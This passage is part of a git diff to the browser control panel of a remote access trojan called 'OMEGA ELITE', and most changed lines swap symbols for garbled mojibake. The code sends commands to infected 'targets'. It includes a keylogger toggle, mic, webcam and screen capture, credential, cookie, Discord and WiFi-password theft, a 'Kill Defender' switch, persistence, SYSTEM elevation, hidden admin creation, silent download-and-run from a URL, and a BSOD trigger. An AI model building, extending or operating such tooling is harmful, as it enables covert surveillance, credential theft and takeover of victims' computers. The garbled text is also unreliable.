 	} else if (state === "connecting") {
 		btn.style.background = "rgba(251,191,36,0.15)";
 		btn.style.color = "#fbbf24";
 		btn.style.borderColor = "#fbbf24";
-		btn.textContent = "⏳ Connecting...";
+		btn.textContent = "â³ Connecting...";
 	} else {
 		btn.style.background = "";
 		btn.style.color = "";
 		btn.style.borderColor = "";
-		btn.textContent = "⚡ WebRTC";
+		btn.textContent = "âš¡ WebRTC";
 		btn.title = "Start P2P direct stream (lower latency)";
 	}
 }
 
 // WebRTC stop is called directly from closeRemote() above
 
-// ═══════════════════════════════════════════════════════════════════
-// ── COMPATIBILITY SHIM ──────────────────────────────────────────────
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ COMPATIBILITY SHIM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // Restores all HTML-callable names that were accidentally underscore-
-// prefixed. Do NOT remove — every onclick in index.html depends on
+// prefixed. Do NOT remove â€” every onclick in index.html depends on
 // these exact names.
-// ═══════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 const showView           = (v)    => _showView(v);
 const execGlobalCmd      = ()     => _execGlobalCmd();
 const toggleChat         = ()     => _toggleChat();
@@ -3694,9 +3706,9 @@ const promptMoveMouse    = ()     => _promptMoveMouse();
 const promptTroll        = (a)    => _promptTroll(a);
 const toggleKeylogger    = ()     => _toggleKeylogger();
 const togglePanel        = ()     => _togglePanel();
-const _triggerFileUpload = ()     => { const i=document.createElement('input'); i.type='file'; i.onchange=(e)=>{ const f=e.target.files[0]; if(!f||!currentTargetId||!socket) return; const r=new FileReader(); r.onload=(ev)=>{ const b64=ev.target.result.split(',')[1]; socket.send(JSON.stringify({type:'upload_file',name:f.name,data:b64,id:currentTargetId})); logEvent(`📤 Uploading ${f.name}...`,'ok'); }; r.readAsDataURL(f); }; i.click(); };
+const _triggerFileUpload = ()     => { const i=document.createElement('input'); i.type='file'; i.onchange=(e)=>{ const f=e.target.files[0]; if(!f||!currentTargetId||!socket) return; const r=new FileReader(); r.onload=(ev)=>{ const b64=ev.target.result.split(',')[1]; socket.send(JSON.stringify({type:'upload_file',name:f.name,data:b64,id:currentTargetId})); logEvent(`ðŸ“¤ Uploading ${f.name}...`,'ok'); }; r.readAsDataURL(f); }; i.click(); };
 
-// ── AUDIO ENGINE: toggleAudio ────────────────────────────────────────
+// â”€â”€ AUDIO ENGINE: toggleAudio â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // Tracks per-stream state: mic / desktop
 const _audioState = { mic: false, desktop: false };
 
@@ -3707,12 +3719,12 @@ function _setAudioBtn(btnId, on) {
 		btn.style.background   = 'rgba(0,255,204,0.15)';
 		btn.style.borderColor  = 'var(--teal)';
 		btn.style.color        = 'var(--teal)';
-		btn.textContent        = btnId === 'btnMicOn' ? '■ Stop Mic' : '■ Stop Desktop';
+		btn.textContent        = btnId === 'btnMicOn' ? 'â–  Stop Mic' : 'â–  Stop Desktop';
 	} else {
 		btn.style.background   = '';
 		btn.style.borderColor  = '';
 		btn.style.color        = '';
-		btn.textContent        = btnId === 'btnMicOn' ? '▶ Listen Mic' : '▶ Listen Desktop';
+		btn.textContent        = btnId === 'btnMicOn' ? 'â–¶ Listen Mic' : 'â–¶ Listen Desktop';
 	}
 	// Mirror toolbar mic/desk buttons
 	if (btnId === 'btnMicOn')  { const t=$('btnAudioMic');  if(t){ t.style.color=on?'var(--teal)':''; t.style.background=on?'rgba(0,255,204,0.12)':''; t.style.borderColor=on?'rgba(0,255,204,0.3)':''; } }
@@ -3720,9 +3732,9 @@ function _setAudioBtn(btnId, on) {
 }
 
 /**
- * toggleAudio(key)        → toggle on/off
- * toggleAudio(key, true)  → force ON
- * toggleAudio(key, false) → force OFF (Stop button calls this)
+ * toggleAudio(key)        â†’ toggle on/off
+ * toggleAudio(key, true)  â†’ force ON
+ * toggleAudio(key, false) â†’ force OFF (Stop button calls this)
  */
 function toggleAudio(key, forceOn) {
 	if (!currentTargetId || !socket) { logEvent('No active session', 'err'); return; }
@@ -3757,8 +3769,8 @@ function toggleAudio(key, forceOn) {
 		const chip = $('audioChip'), lbl = $('audioSourceLabel');
 		if (chip) chip.style.display = 'flex';
 		if (lbl)  lbl.textContent = _audioState.mic && _audioState.desktop ? 'MIC+DESK' : key === 'mic' ? 'MIC' : 'DESK';
-		logEvent(`🎙 ${key === 'mic' ? 'Mic' : 'Desktop'} audio started`, 'ok');
-		showToast(`🎙 ${key === 'mic' ? 'Microphone' : 'Desktop Audio'} activated`, 'teal');
+		logEvent(`ðŸŽ™ ${key === 'mic' ? 'Mic' : 'Desktop'} audio started`, 'ok');
+		showToast(`ðŸŽ™ ${key === 'mic' ? 'Microphone' : 'Desktop Audio'} activated`, 'teal');
 	} else {
 		socket.send(JSON.stringify({
 			type:    'audio_stop',
@@ -3777,12 +3789,12 @@ function toggleAudio(key, forceOn) {
 			const chip = $('audioChip');
 			if (chip) chip.style.display = 'none';
 		}
-		logEvent(`🔇 ${key === 'mic' ? 'Mic' : 'Desktop'} audio stopped`, 'warn');
-		showToast(`🔇 ${key === 'mic' ? 'Microphone' : 'Desktop Audio'} off`, 'warn');
+		logEvent(`ðŸ”‡ ${key === 'mic' ? 'Mic' : 'Desktop'} audio stopped`, 'warn');
+		showToast(`ðŸ”‡ ${key === 'mic' ? 'Microphone' : 'Desktop Audio'} off`, 'warn');
 	}
 }
 
-// ── PREMIUM MONITOR SWITCHER ─────────────────────────────────────────
+// â”€â”€ PREMIUM MONITOR SWITCHER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 // Replaces the plain <select> with glowing pill buttons in the toolbar
 function buildMonitorPills(count) {
 	const wrapper = $('monitorSelector');
@@ -3820,7 +3832,7 @@ function buildMonitorPills(count) {
 }
 
 window.selectMonitorPill = function(idx) {
-	// Visual update — highlight selected pill
+	// Visual update â€” highlight selected pill
 	document.querySelectorAll('[id^="monPill_"]').forEach((p, i) => {
 		const active = i === idx;
 		p.style.borderColor = active ? 'var(--accent)' : 'rgba(255,255,255,0.1)';
@@ -3832,7 +3844,7 @@ window.selectMonitorPill = function(idx) {
 	if (hudSel) hudSel.value = idx;
 	// Send switch command
 	switchMonitor(idx);
-	logEvent(`🖥 Switched to Screen ${idx+1}`, 'ok');
+	logEvent(`ðŸ–¥ Switched to Screen ${idx+1}`, 'ok');
 };
 
 // Hook into openRemote to build pills after specs are known
@@ -3851,21 +3863,21 @@ window.renderRemoteSpecs = function(s) {
 	buildMonitorPills(s.monitors || 1);
 };
 
-/* ═══════════════════════════════════════════════════════════════════
-   OMEGA ELITE — JS HELPER PACK v3
-   ═══════════════════════════════════════════════════════════════════ */
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   OMEGA ELITE â€” JS HELPER PACK v3
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 
-// ── File helpers ──
+// â”€â”€ File helpers â”€â”€
 window._promptReadFile = function() {
-	const path = prompt("📄 Full path to read:", "C:\\Users\\Public\\test.txt");
+	const path = prompt("ðŸ“„ Full path to read:", "C:\\Users\\Public\\test.txt");
 	if (path) sendCmd("read_file", { path });
 };
 window._promptDeleteFile = function() {
-	const path = prompt("🗑 Full path to DELETE (irreversible):", "");
+	const path = prompt("ðŸ—‘ Full path to DELETE (irreversible):", "");
 	if (path && confirm(`DELETE: ${path}\n\nAre you absolutely sure?`)) sendCmd("delete_file", { path });
 };
 
-// ── System helpers ──
+// â”€â”€ System helpers â”€â”€
 window._promptMsgBox = function() {
 	const title = prompt("MessageBox title:", "System Alert") || "Alert";
 	const text  = prompt("MessageBox text:", "Omega says hello.") || "";
@@ -3879,11 +3891,11 @@ window._promptCreateUser = function() {
 	if (confirm(`Create hidden admin: '${user}'?`)) sendCmd("create_user", { user, pass });
 };
 window._promptSetVolume = function() {
-	const level = prompt("Set master volume (0–100):", "50");
+	const level = prompt("Set master volume (0â€“100):", "50");
 	if (level !== null) sendCmd("set_volume", { level: parseInt(level) || 50 });
 };
 
-// ── Service helpers ──
+// â”€â”€ Service helpers â”€â”€
 window._promptStopService = function() {
 	const name = prompt("Service name to STOP:", "WSearch");
 	if (name) sendCmd("stop_service", { name });
@@ -3893,19 +3905,19 @@ window._promptStartService = function() {
 	if (name) sendCmd("start_service", { name });
 };
 
-// ── Process helpers ──
+// â”€â”€ Process helpers â”€â”€
 window._promptKillByName = function() {
 	const name = prompt("Process image name to kill (e.g. notepad.exe):", "notepad.exe");
 	if (name) sendCmd("kill_process_name", { name });
 };
 
-// ── Network helpers ──
+// â”€â”€ Network helpers â”€â”€
 window._promptRunUrl = function() {
 	const url = prompt("URL of file to download & run silently:", "https://");
 	if (url && url.startsWith("http")) sendCmd("run_url", { url });
 };
 
-// ── Power helpers ──
+// â”€â”€ Power helpers â”€â”€
 window._promptShutdown = function() {
 	const delay = prompt("Shutdown in N seconds:", "30");
 	if (delay !== null) sendCmd("shutdown", { delay: parseInt(delay) || 30 });
@@ -3915,13 +3927,13 @@ window._promptRestart = function() {
 	if (delay !== null) sendCmd("restart", { delay: parseInt(delay) || 30 });
 };
 
-// ── Wallpaper prompt ──
+// â”€â”€ Wallpaper prompt â”€â”€
 window.promptWallpaper = window.promptWallpaper || function() {
-	const url = prompt("🖼 Wallpaper image URL:", "https://");
+	const url = prompt("ðŸ–¼ Wallpaper image URL:", "https://");
 	if (url && url.startsWith("http")) sendCmd("set_wallpaper", { url });
 };
 
-// ── file_download handler — triggers browser-side download ──
+// â”€â”€ file_download handler â€” triggers browser-side download â”€â”€
 // Registered as a post-process on incoming messages from agent
 (function() {
 	const _wsOnMsg = window._onAgentMsg;
@@ -3937,9 +3949,9 @@ window.promptWallpaper = window.promptWallpaper || function() {
 				document.body.appendChild(a);
 				a.click();
 				setTimeout(() => { a.remove(); URL.revokeObjectURL(a.href); }, 1500);
-				if (typeof showToast === "function") showToast(`📥 Downloaded: ${d.name}`, "teal");
+				if (typeof showToast === "function") showToast(`ðŸ“¥ Downloaded: ${d.name}`, "teal");
 			} catch(e) {
-				if (typeof showToast === "function") showToast(`❌ DL error: ${e}`, "red");
+				if (typeof showToast === "function") showToast(`âŒ DL error: ${e}`, "red");
 			}
 			return; // Don't forward
 		}
@@ -3947,21 +3959,21 @@ window.promptWallpaper = window.promptWallpaper || function() {
 	};
 })();
 
-/* ═══════════════════════════════════════════════════════════════════
-   OMEGA ELITE — JS HELPER PACK v4
-   ═══════════════════════════════════════════════════════════════════ */
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   OMEGA ELITE â€” JS HELPER PACK v4
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 
-// ── Network helpers ──
+// â”€â”€ Network helpers â”€â”€
 window._promptBlockSite = function() {
-	const site = prompt("🚫 Domain to block (e.g. reddit.com):", "");
+	const site = prompt("ðŸš« Domain to block (e.g. reddit.com):", "");
 	if (site) sendCmd("block_website", { site });
 };
 window._promptUnblockSite = function() {
-	const site = prompt("✅ Domain to unblock:", "");
+	const site = prompt("âœ… Domain to unblock:", "");
 	if (site) sendCmd("unblock_website", { site });
 };
 
-// ── Registry helpers ──
+// â”€â”€ Registry helpers â”€â”€
 window._promptRegDelete = function() {
 	const hive  = prompt("Hive (HKCU / HKLM / HKCR):", "HKCU") || "HKCU";
 	const path  = prompt("Key path (e.g. Software\\Test):", "") || "";
@@ -3969,74 +3981,74 @@ window._promptRegDelete = function() {
 	if (path) sendCmd("reg_delete", { hive, path, value });
 };
 
-// ── Kill by name (missing from prev pack) ──
+// â”€â”€ Kill by name (missing from prev pack) â”€â”€
 window._promptKillByName = window._promptKillByName || function() {
 	const name = prompt("Process image name to kill (e.g. notepad.exe):", "notepad.exe");
 	if (name) sendCmd("kill_process_name", { name });
 };
 
-/* ── COMMAND PALETTE (Ctrl+K or Ctrl+/) ─────────────────────────── */
+/* â”€â”€ COMMAND PALETTE (Ctrl+K or Ctrl+/) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 (function _initCommandPalette() {
 	// Build catalogue of all known commands
 	const CATALOGUE = [
 		// Surveillance
-		{ label: "📸 Screenshot",         cmd: "screenshot_snap",      args: {} },
-		{ label: "📸 Webcam Snap",         cmd: "webcam_snap",          args: {idx:0}, prompt: true },
-		{ label: "🎥 Record Screen 10s",   cmd: "record_screen",        args: {duration:10} },
-		{ label: "🎥 Record Webcam 5s",    cmd: "record_webcam",        args: {duration:5} },
-		{ label: "🎙 Record Voice 30s",    cmd: "record_voice",         args: {duration:30} },
-		{ label: "🔑 Steal Creds",         cmd: "stealer",              args: {} },
-		{ label: "🍪 Steal Cookies",       cmd: "cookie_steal",         args: {} },
-		{ label: "💬 Discord Hijack",      cmd: "discord_steal",        args: {} },
-		{ label: "🌐 Browser History",     cmd: "browser_history",      args: {} },
+		{ label: "ðŸ“¸ Screenshot",         cmd: "screenshot_snap",      args: {} },
+		{ label: "ðŸ“¸ Webcam Snap",         cmd: "webcam_snap",          args: {idx:0}, prompt: true },
+		{ label: "ðŸŽ¥ Record Screen 10s",   cmd: "record_screen",        args: {duration:10} },
+		{ label: "ðŸŽ¥ Record Webcam 5s",    cmd: "record_webcam",        args: {duration:5} },
+		{ label: "ðŸŽ™ Record Voice 30s",    cmd: "record_voice",         args: {duration:30} },
+		{ label: "ðŸ”‘ Steal Creds",         cmd: "stealer",              args: {} },
+		{ label: "ðŸª Steal Cookies",       cmd: "cookie_steal",         args: {} },
+		{ label: "ðŸ’¬ Discord Hijack",      cmd: "discord_steal",        args: {} },
+		{ label: "ðŸŒ Browser History",     cmd: "browser_history",      args: {} },
 		// Files
-		{ label: "📋 Get Clipboard",       cmd: "clipboard_get",        args: {} },
-		{ label: "🪟 Active Window",       cmd: "active_window",        args: {} },
-		{ label: "🕐 Recent Files",        cmd: "get_recent_files",     args: {} },
-		{ label: "🗑 Empty Recycle Bin",   cmd: "recycle_bin",          args: {} },
+		{ label: "ðŸ“‹ Get Clipboard",       cmd: "clipboard_get",        args: {} },
+		{ label: "ðŸªŸ Active Window",       cmd: "active_window",        args: {} },
+		{ label: "ðŸ• Recent Files",        cmd: "get_recent_files",     args: {} },
+		{ label: "ðŸ—‘ Empty Recycle Bin",   cmd: "recycle_bin",          args: {} },
 		// System
-		{ label: "📊 Full Audit",          cmd: "get_system_info",      args: {} },
-		{ label: "👤 Whoami",              cmd: "whoami",               args: {} },
-		{ label: "💾 Drives",              cmd: "drives",               args: {} },
-		{ label: "📊 Disk Usage",          cmd: "disk_usage",           args: {} },
-		{ label: "🌿 Env Vars",            cmd: "env_vars",             args: {} },
-		{ label: "🚀 Startup Programs",    cmd: "list_startup",         args: {} },
-		{ label: "📦 Installed Apps",      cmd: "get_installed",        args: {} },
-		{ label: "👥 List Users",          cmd: "get_users",            args: {} },
-		{ label: "🔋 Battery",             cmd: "get_battery",          args: {} },
-		{ label: "🔊 Get Volume",          cmd: "get_volume",           args: {} },
-		{ label: "⚙️ List Services",       cmd: "get_services",         args: {} },
-		{ label: "🔑 Win Product Key",     cmd: "get_product_key",      args: {} },
-		{ label: "🖥 Monitor Info",        cmd: "get_monitor_info",     args: {} },
-		{ label: "📊 Proc Details",        cmd: "detailed_process_list",args: {} },
-		{ label: "📜 PS History",          cmd: "cmd_history",          args: {} },
-		{ label: "🔍 Prefetch",            cmd: "get_prefetch",         args: {} },
-		{ label: "🚫 Kill Defender",       cmd: "disable_defender",     args: {} },
-		{ label: "✅ Restore Defender",    cmd: "enable_defender",      args: {} },
-		{ label: "🔗 Task Persist",        cmd: "task_scheduler_add",   args: {} },
-		{ label: "✖ Remove Task",          cmd: "task_scheduler_remove",args: {} },
-		{ label: "🔒 Lock Screen",         cmd: "lock_screen",          args: {} },
-		{ label: "🔄 Startup Persist",     cmd: "startup_persist",      args: {} },
-		{ label: "🔍 Check Persist",       cmd: "check_persistence",    args: {} },
-		{ label: "⚡ Elevate SYSTEM",      cmd: "elevate_system",       args: {} },
+		{ label: "ðŸ“Š Full Audit",          cmd: "get_system_info",      args: {} },
+		{ label: "ðŸ‘¤ Whoami",              cmd: "whoami",               args: {} },
+		{ label: "ðŸ’¾ Drives",              cmd: "drives",               args: {} },
+		{ label: "ðŸ“Š Disk Usage",          cmd: "disk_usage",           args: {} },
+		{ label: "ðŸŒ¿ Env Vars",            cmd: "env_vars",             args: {} },
+		{ label: "ðŸš€ Startup Programs",    cmd: "list_startup",         args: {} },
+		{ label: "ðŸ“¦ Installed Apps",      cmd: "get_installed",        args: {} },
+		{ label: "ðŸ‘¥ List Users",          cmd: "get_users",            args: {} },
+		{ label: "ðŸ”‹ Battery",             cmd: "get_battery",          args: {} },
+		{ label: "ðŸ”Š Get Volume",          cmd: "get_volume",           args: {} },
+		{ label: "âš™ï¸ List Services",       cmd: "get_services",         args: {} },
+		{ label: "ðŸ”‘ Win Product Key",     cmd: "get_product_key",      args: {} },
+		{ label: "ðŸ–¥ Monitor Info",        cmd: "get_monitor_info",     args: {} },
+		{ label: "ðŸ“Š Proc Details",        cmd: "detailed_process_list",args: {} },
+		{ label: "ðŸ“œ PS History",          cmd: "cmd_history",          args: {} },
+		{ label: "ðŸ” Prefetch",            cmd: "get_prefetch",         args: {} },
+		{ label: "ðŸš« Kill Defender",       cmd: "disable_defender",     args: {} },
+		{ label: "âœ… Restore Defender",    cmd: "enable_defender",      args: {} },
+		{ label: "ðŸ”— Task Persist",        cmd: "task_scheduler_add",   args: {} },
+		{ label: "âœ– Remove Task",          cmd: "task_scheduler_remove",args: {} },
+		{ label: "ðŸ”’ Lock Screen",         cmd: "lock_screen",          args: {} },
+		{ label: "ðŸ”„ Startup Persist",     cmd: "startup_persist",      args: {} },
+		{ label: "ðŸ” Check Persist",       cmd: "check_persistence",    args: {} },
+		{ label: "âš¡ Elevate SYSTEM",      cmd: "elevate_system",       args: {} },
 		// Network
-		{ label: "📶 WiFi Passwords",      cmd: "wifi_passwords",       args: {} },
-		{ label: "🔌 Open Ports",          cmd: "get_open_ports",       args: {} },
-		{ label: "🌍 Geolocation",         cmd: "get_geo",              args: {} },
-		{ label: "📶 ARP Table",           cmd: "get_arp",              args: {} },
-		{ label: "📄 DNS Cache",           cmd: "get_dns_cache",        args: {} },
-		{ label: "🔄 Flush DNS",           cmd: "flush_dns",            args: {} },
-		{ label: "🔍 Deep LAN Scan",       cmd: "net_scan",             args: {} },
+		{ label: "ðŸ“¶ WiFi Passwords",      cmd: "wifi_passwords",       args: {} },
+		{ label: "ðŸ”Œ Open Ports",          cmd: "get_open_ports",       args: {} },
+		{ label: "ðŸŒ Geolocation",         cmd: "get_geo",              args: {} },
+		{ label: "ðŸ“¶ ARP Table",           cmd: "get_arp",              args: {} },
+		{ label: "ðŸ“„ DNS Cache",           cmd: "get_dns_cache",        args: {} },
+		{ label: "ðŸ”„ Flush DNS",           cmd: "flush_dns",            args: {} },
+		{ label: "ðŸ” Deep LAN Scan",       cmd: "net_scan",             args: {} },
 		// Power
-		{ label: "🔄 Restart (10s)",       cmd: "restart",              args: {delay:10} },
-		{ label: "⏻ Shutdown (10s)",       cmd: "shutdown",             args: {delay:10} },
-		{ label: "🚪 Logoff",              cmd: "logoff",               args: {} },
-		{ label: "✅ Cancel Shutdown",     cmd: "cancel_shutdown",      args: {} },
+		{ label: "ðŸ”„ Restart (10s)",       cmd: "restart",              args: {delay:10} },
+		{ label: "â» Shutdown (10s)",       cmd: "shutdown",             args: {delay:10} },
+		{ label: "ðŸšª Logoff",              cmd: "logoff",               args: {} },
+		{ label: "âœ… Cancel Shutdown",     cmd: "cancel_shutdown",      args: {} },
 		// Trolls
-		{ label: "🔒 Block MNK",          cmd: "troll",                args: {c:"mnk"} },
-		{ label: "📝 Notepad ×5",         cmd: "troll",                args: {c:"notepadspam"} },
-		{ label: "🔄 Fake Win Update",    cmd: "troll",                args: {c:"fake_update"} },
-		{ label: "💀 Trigger BSOD",       cmd: "bsod",                 args: {} },
+		{ label: "ðŸ”’ Block MNK",          cmd: "troll",                args: {c:"mnk"} },
+		{ label: "ðŸ“ Notepad Ã—5",         cmd: "troll",                args: {c:"notepadspam"} },
+		{ label: "ðŸ”„ Fake Win Update",    cmd: "troll",                args: {c:"fake_update"} },
+		{ label: "ðŸ’€ Trigger BSOD",       cmd: "bsod",                 args: {} },
 	];
 
 	let _paletteOpen = false;
@@ -4056,8 +4068,8 @@ window._promptKillByName = window._promptKillByName || function() {
 		`;
 		el.innerHTML = `
 			<div style="display:flex;align-items:center;gap:.75rem;padding:.9rem 1.2rem;border-bottom:1px solid rgba(255,255,255,.06)">
-				<span style="color:var(--accent);font-size:1rem">⌘</span>
-				<input id="cmdPaletteInput" placeholder="Search commands…"
+				<span style="color:var(--accent);font-size:1rem">âŒ˜</span>
+				<input id="cmdPaletteInput" placeholder="Search commandsâ€¦"
 					style="flex:1;background:transparent;border:none;color:#fff;font-family:'Outfit',sans-serif;font-size:.9rem;outline:none">
 				<span style="font-size:.6rem;color:var(--text-3);background:rgba(255,255,255,.06);padding:.2rem .5rem;border-radius:5px">ESC</span>
 			</div>
@@ -4122,7 +4134,7 @@ window._promptKillByName = window._promptKillByName || function() {
 		const args = JSON.parse(el.dataset.args || "{}");
 		sendCmd(cmd, args);
 		_closePalette();
-		if (typeof showToast === "function") showToast(`⌘ ${cmd}`, "teal");
+		if (typeof showToast === "function") showToast(`âŒ˜ ${cmd}`, "teal");
 	};
 
 	function _openPalette() {
@@ -4155,18 +4167,18 @@ window._promptKillByName = window._promptKillByName || function() {
 	window.openCommandPalette = _openPalette;
 })();
 
-/* ── RIGHT-CLICK CONTEXT MENU ON NODE CARDS ─────────────────────── */
+/* â”€â”€ RIGHT-CLICK CONTEXT MENU ON NODE CARDS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 (function _initNodeContextMenu() {
 	const MENU_ITEMS = [
-		{ label: "🖥 Open Remote",    fn: n => openRemote(n.id, n) },
-		{ label: "📸 Screenshot",     fn: n => sendCmdTo(n.id, "screenshot_snap", {}) },
-		{ label: "📋 Get Clipboard",  fn: n => sendCmdTo(n.id, "clipboard_get", {}) },
-		{ label: "🌍 Geolocation",    fn: n => sendCmdTo(n.id, "get_geo", {}) },
-		{ label: "📊 Full Audit",     fn: n => sendCmdTo(n.id, "get_system_info", {}) },
-		{ label: "🔋 Battery",        fn: n => sendCmdTo(n.id, "get_battery", {}) },
-		{ label: "🔒 Lock Screen",    fn: n => sendCmdTo(n.id, "lock_screen", {}) },
-		{ label: "🔄 Restart (10s)",  fn: n => sendCmdTo(n.id, "restart", {delay:10}) },
-		{ label: "⏻ Shutdown (10s)", fn: n => sendCmdTo(n.id, "shutdown", {delay:10}) },
+		{ label: "ðŸ–¥ Open Remote",    fn: n => openRemote(n.id, n) },
+		{ label: "ðŸ“¸ Screenshot",     fn: n => sendCmdTo(n.id, "screenshot_snap", {}) },
+		{ label: "ðŸ“‹ Get Clipboard",  fn: n => sendCmdTo(n.id, "clipboard_get", {}) },
+		{ label: "ðŸŒ Geolocation",    fn: n => sendCmdTo(n.id, "get_geo", {}) },
+		{ label: "ðŸ“Š Full Audit",     fn: n => sendCmdTo(n.id, "get_system_info", {}) },
+		{ label: "ðŸ”‹ Battery",        fn: n => sendCmdTo(n.id, "get_battery", {}) },
+		{ label: "ðŸ”’ Lock Screen",    fn: n => sendCmdTo(n.id, "lock_screen", {}) },
+		{ label: "ðŸ”„ Restart (10s)",  fn: n => sendCmdTo(n.id, "restart", {delay:10}) },
+		{ label: "â» Shutdown (10s)", fn: n => sendCmdTo(n.id, "shutdown", {delay:10}) },
 	];
 
 	let _ctxMenu = null;
@@ -4231,7 +4243,7 @@ window._promptKillByName = window._promptKillByName || function() {
 	});
 })();
 
-/* ── EXPORT LOGS TO FILE ─────────────────────────────────────────── */
+/* â”€â”€ EXPORT LOGS TO FILE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
 window.exportLogs = function() {
 	const logEl = document.getElementById("eventLog") || document.querySelector("[id*='log']");
 	const text  = logEl ? logEl.innerText : "No log element found.";
@@ -4243,12 +4255,12 @@ window.exportLogs = function() {
 	document.body.appendChild(a);
 	a.click();
 	setTimeout(() => { a.remove(); URL.revokeObjectURL(a.href); }, 1000);
-	if (typeof showToast === "function") showToast("📥 Logs exported", "teal");
+	if (typeof showToast === "function") showToast("ðŸ“¥ Logs exported", "teal");
 };
 
-// ══════════════════════════════════════════════════════════════════════════════
-// ── FEATURE: GRAPHICAL FILE EXPLORER ─────────────────────────────────────────
-// ══════════════════════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// â”€â”€ FEATURE: GRAPHICAL FILE EXPLORER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 let _fsBreadcrumb = [];
 let _fsNodeId = null;
 
@@ -4264,15 +4276,15 @@ window.openFileExplorer = function(nodeId, startPath) {
 		<div style="width:min(860px,95vw);height:min(580px,90vh);background:rgba(8,8,12,.97);border:1px solid rgba(0,240,255,.25);border-radius:20px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.9)">
 			<div style="padding:1rem 1.25rem;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between">
 				<div style="display:flex;align-items:center;gap:.75rem">
-					<span style="font-size:1.1rem">📂</span>
+					<span style="font-size:1.1rem">ðŸ“‚</span>
 					<div>
 						<div style="font-size:.85rem;font-weight:800;color:var(--accent)">FILE EXPLORER</div>
 						<div id="fsBreadcrumb" style="font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">/</div>
 					</div>
 				</div>
 				<div style="display:flex;gap:.5rem;align-items:center">
-					<button type="button" onclick="window._fsUpload()" style="background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.3);color:var(--accent);border-radius:8px;padding:.35rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">📤 Upload</button>
-					<button type="button" onclick="$('fileExplorerModal').style.display='none'" style="background:rgba(255,42,95,.1);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:8px;padding:.35rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">✕ Close</button>
+					<button type="button" onclick="window._fsUpload()" style="background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.3);color:var(--accent);border-radius:8px;padding:.35rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">ðŸ“¤ Upload</button>
+					<button type="button" onclick="$('fileExplorerModal').style.display='none'" style="background:rgba(255,42,95,.1);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:8px;padding:.35rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">âœ• Close</button>
 				</div>
 			</div>
